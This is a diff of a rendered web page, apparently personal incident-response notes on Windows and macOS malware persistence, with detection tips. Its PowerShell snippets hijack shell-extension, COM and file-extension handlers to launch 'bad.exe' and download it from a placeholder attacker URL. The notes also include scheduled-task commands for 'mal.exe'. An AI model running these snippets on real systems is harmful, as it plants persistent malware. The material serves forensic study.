@@ -11,7 +11,7 @@
   <link href="/css/style-classic.css"></link>
   
   
-  <link rel="stylesheet" href="/css/style.min.eeb61b3f25f73088eb3aeb02bc61f28d33975f447fc5649add3b83c10059c331.css">
+  <link rel="stylesheet" href="/css/style.min.9d91cbb32c96c334ae7b38c3d99d30727e0836e1182125cc5f007d215f0b9e59.css">
   
 
   
@@ -258,8 +258,8 @@
 </ol>
 <h3 id="autoruns">Autoruns</h3>
 <p>🔑 <code>SOFTWARE</code> hive (system wide) and <code>NTUSER.dat</code> (user-specific): <code>Software\Microsoft\Windows\CurrentVersion\Run</code>, <code>Software\Microsoft\Windows\CurrentVersion\RunOnce</code>. <code>SOFTWARE</code> hive also has <code>Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> and <code>Software\Microsoft\Windows NT\Winlogon\Userinit</code> (contains reference to the <code>userinit.exe</code>, but can specify other executebles separated with <code>;</code>). File system: <code>%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. 💡 I would also check running processes on the live system to see which processes were started at system start up (time launched is too close to <code>winlogon</code> for example, or any other core process that starts at boot).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">autorunsc -v <span class="o">[</span>options<span class="o">]</span> &gt; result.csv
-</span></span></code></pre></div><h3 id="scheduled-tasks">Scheduled tasks</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">autorunsc -v <span class="o">[</span>options<span class="o">]</span> &gt; result.csv
+</code></pre></div><h3 id="scheduled-tasks">Scheduled tasks</h3>
 <p><code>at.exe</code> (deprecated but can still be used) and <code>schtasks.exe</code>. For <code>at</code> see <code>at*.job</code> and <code>Schdlgu.txt</code> and Task Scheduler and Security Logs for the second one. WinXP: at jobs run with SYSTEM privileges. Files are created here: <code>\Windows\Tasks</code> and <code>\Windows\System32\Tasks</code> (xml duplicate Win7+). Created with: <code>at.exe 22:22:22 C:\mal.exe</code> or <code>schtasks.exe /create /sc daily /tn winsvchost /tr C:\mal.exe</code>.</p>
 <h3 id="dll-hijacking">DLL Hijacking</h3>
 <p>My presentation is available in files section in Russian 🇷🇺.</p>
@@ -285,63 +285,63 @@
 <p>⚠️  WMI consumers run with SYSTEM privileges.</p>
 </blockquote>
 <p>Init of event filter, consumer and binder are usually contained withing a <code>MOF</code> file used to register new classes into the WMI repo. <code>Set-WmiInstance</code> or <code>CreateInstance</code> can also be used. Just to note, metasploit can do that as well (powershell commands under the hood?). Example 🦠: Stuxnet.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">wmic</span> <span class="p">/?</span>
-</span></span><span class="line"><span class="cl"><span class="n">wmic</span> <span class="p">/</span><span class="n">node</span><span class="err">:</span><span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">startup</span> <span class="n">list</span> <span class="n">full</span>
-</span></span><span class="line"><span class="cl"><span class="n">wmic</span> <span class="p">/</span><span class="n">node</span><span class="err">:</span><span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">nicconfig</span> <span class="n">get</span>
-</span></span><span class="line"><span class="cl"><span class="n">wmic</span> <span class="p">/</span><span class="n">node</span><span class="err">:</span><span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="k">process</span> <span class="n">get</span>
-</span></span></code></pre></div><p><strong>Tools</strong> 🛠: Cmdlet <code>Get-WmiOject</code> can identify and delete entries, Kansa Framework, Autoruns (sysinternals).</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">wmic</span> <span class="p">/?</span>
+<span class="n">wmic</span> <span class="p">/</span><span class="n">node</span><span class="err">:</span><span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">startup</span> <span class="n">list</span> <span class="n">full</span>
+<span class="n">wmic</span> <span class="p">/</span><span class="n">node</span><span class="err">:</span><span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">nicconfig</span> <span class="n">get</span>
+<span class="n">wmic</span> <span class="p">/</span><span class="n">node</span><span class="err">:</span><span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="k">process</span> <span class="n">get</span>
+</code></pre></div><p><strong>Tools</strong> 🛠: Cmdlet <code>Get-WmiOject</code> can identify and delete entries, Kansa Framework, Autoruns (sysinternals).</p>
 <p>📚 <strong>References</strong>: <a href="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/">pentest lab article</a>, SANS <a href="https://www.sans.org/blog/wmic-for-incident-response/">article</a>.</p>
 <h3 id="local-group-policy">Local group policy</h3>
 <h3 id="ms-office-add-in">MS Office Add-In</h3>
 <h3 id="flushing-bios">Flushing BIOS</h3>
 <h3 id="shell-extension-handlers">Shell Extension Handlers</h3>
 <p><code>Computer\HKCU\Software\Classes\*\shellex\ContextMenuHandlers</code>. Same under <code>HKLM</code>. ⚠️ No need to provide admin creds to add a value here, to HKCU only. GUID here is the same as listed in CLSID subkey.  To add a malicious extension one needs to create a unique GUID, add a subkey to CLSID, add a path to <code>dll</code>, and then add a shell extension in the registry above using the same GUID. Use 🛠 OLE/COM object Viewer to see all COM objects registered. Simply clicking an image or a archive file may trigger a malicious act.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Path</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\*\shellex\ContectMenuHandlers\BadExt&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Name</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Value</span><span class="p">=</span><span class="s2">&#34;{GUID}&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$Path1</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32&#34;</span> <span class="c"># example</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Name1</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Value1</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path1</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path1</span> <span class="n">-Name</span> <span class="nv">$Name1</span> <span class="n">-Value</span> <span class="nv">$Value1</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>	
-</span></span></code></pre></div><h3 id="com-hijack">COM Hijack</h3>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$Path</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\*\shellex\ContectMenuHandlers\BadExt&#34;</span>
+<span class="nv">$Name</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
+<span class="nv">$Value</span><span class="p">=</span><span class="s2">&#34;{GUID}&#34;</span>
+
+<span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
+<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
+
+<span class="nv">$Path1</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32&#34;</span> <span class="c"># example</span>
+<span class="nv">$Name1</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
+<span class="nv">$Value1</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\bad.exe&#34;</span>
+
+<span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path1</span> <span class="n">-Force</span>
+<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path1</span> <span class="n">-Name</span> <span class="nv">$Name1</span> <span class="n">-Value</span> <span class="nv">$Value1</span>
+
+<span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
+<span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
+
+<span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>	
+</code></pre></div><h3 id="com-hijack">COM Hijack</h3>
 <p>In Process Monitor filter: <em>Path contains CLSID</em> and <em>Result is NAME NOT FOUND</em>. The entry exists in <code>HKLM\Software\Classes\CLSID\{GUID}</code>, but doesn&rsquo;t exist at <code>HKCU\Software\Classes\CLSID\{GUID}</code>. It looks for the entry in HKCU first, if not found, in HKLM. That&rsquo;s where we can add an entry under HKCU. Powershell needs to be used, since it&rsquo;s a trusted application for registry.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$Path1</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32&#34;</span> <span class="c"># example</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Name1</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Value1</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>	
-</span></span></code></pre></div><h3 id="extension-handler-hijacking">Extension Handler Hijacking</h3>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$Path1</span><span class="p">=</span><span class="s2">&#34;HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32&#34;</span> <span class="c"># example</span>
+<span class="nv">$Name1</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
+<span class="nv">$Value1</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\bad.exe&#34;</span>
+
+<span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
+<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
+
+<span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
+<span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
+
+<span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>	
+</code></pre></div><h3 id="extension-handler-hijacking">Extension Handler Hijacking</h3>
 <p><code>Computer\HKCR\</code>, subkeys <code>Open</code> and <code>Command</code>. An attackere can&rsquo;t change HKCR or HKLM, but can change <code>HKCU</code> and <code>HKU</code> without admin privileges. Using a proxy within <code>Command</code> will help remain low: <code>proxy.exe &quot;{path/to/real/app}&quot;</code> (starts the meterpreter, for example, then launches the real appliation). ⚠️ Powershell is not necessary, HKU hive can be edited without it.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-PSDrive</span> <span class="n">-PSProvider</span> <span class="n">Registry</span> <span class="n">-Name</span> <span class="n">HKU</span> <span class="n">-Root</span> <span class="n">HKEY_USERS</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Path</span><span class="p">=</span><span class="s2">&#34;HKU:\{SID}_Classes\VLC.mp4\shell\Open\Command&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Name</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Value</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>
-</span></span></code></pre></div><p>Read more about the above techniques: <a href="https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394">Wipe the drive! Stealthy Malware Persistence - Part 1</a> and <a href="https://isc.sans.edu/forums/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Part+2/15406/">Wipe the drive! Stealthy Malware Persistence - Part 2</a>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">New-PSDrive</span> <span class="n">-PSProvider</span> <span class="n">Registry</span> <span class="n">-Name</span> <span class="n">HKU</span> <span class="n">-Root</span> <span class="n">HKEY_USERS</span>
+<span class="nv">$Path</span><span class="p">=</span><span class="s2">&#34;HKU:\{SID}_Classes\VLC.mp4\shell\Open\Command&#34;</span>
+<span class="nv">$Name</span><span class="p">=</span><span class="s2">&#34;(Default)&#34;</span>
+<span class="nv">$Value</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
+
+<span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Force</span>
+<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Name</span> <span class="nv">$Name</span> <span class="n">-Value</span> <span class="nv">$Value</span>
+
+<span class="nv">$Url</span><span class="p">=</span><span class="s2">&#34;https://attackersurl/bad.exe&#34;</span>
+<span class="nv">$Out</span><span class="p">=</span><span class="s2">&#34;C:\\tmp\\bad.exe&#34;</span>
+
+<span class="nb">Invoke-WebRequest</span>	<span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Outfile</span> <span class="nv">$Out</span>
+</code></pre></div><p>Read more about the above techniques: <a href="https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394">Wipe the drive! Stealthy Malware Persistence - Part 1</a> and <a href="https://isc.sans.edu/forums/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Part+2/15406/">Wipe the drive! Stealthy Malware Persistence - Part 2</a>.</p>
 <h2 id="macos">macOS</h2>
 <p><code>System Preferences -&gt; Users &amp; Groups -&gt; Login Items</code>. Additional: SDF podcast.</p>
 <p>How to determine if it&rsquo;s malicious? Well, the sure way is only to reverse engineer it, but it is time consuming. So, you need to narrow down the candidates first. There are a couple of indicators that are commonly seen in malware.</p>
@@ -377,7 +377,7 @@
   
 
   
-  <script type="text/javascript" src="/js/scripts.min.bafc052229b4b40bf03c477d31c5cdd9352ece8afbadf35ab97ed14495098fc9.js"></script>
+  <script type="text/javascript" src="/js/scripts.min.1237ff71925bb8625c97a9af8db4c54525258bedfd7c47493daaff723bea755e.js"></script>
   
 
   
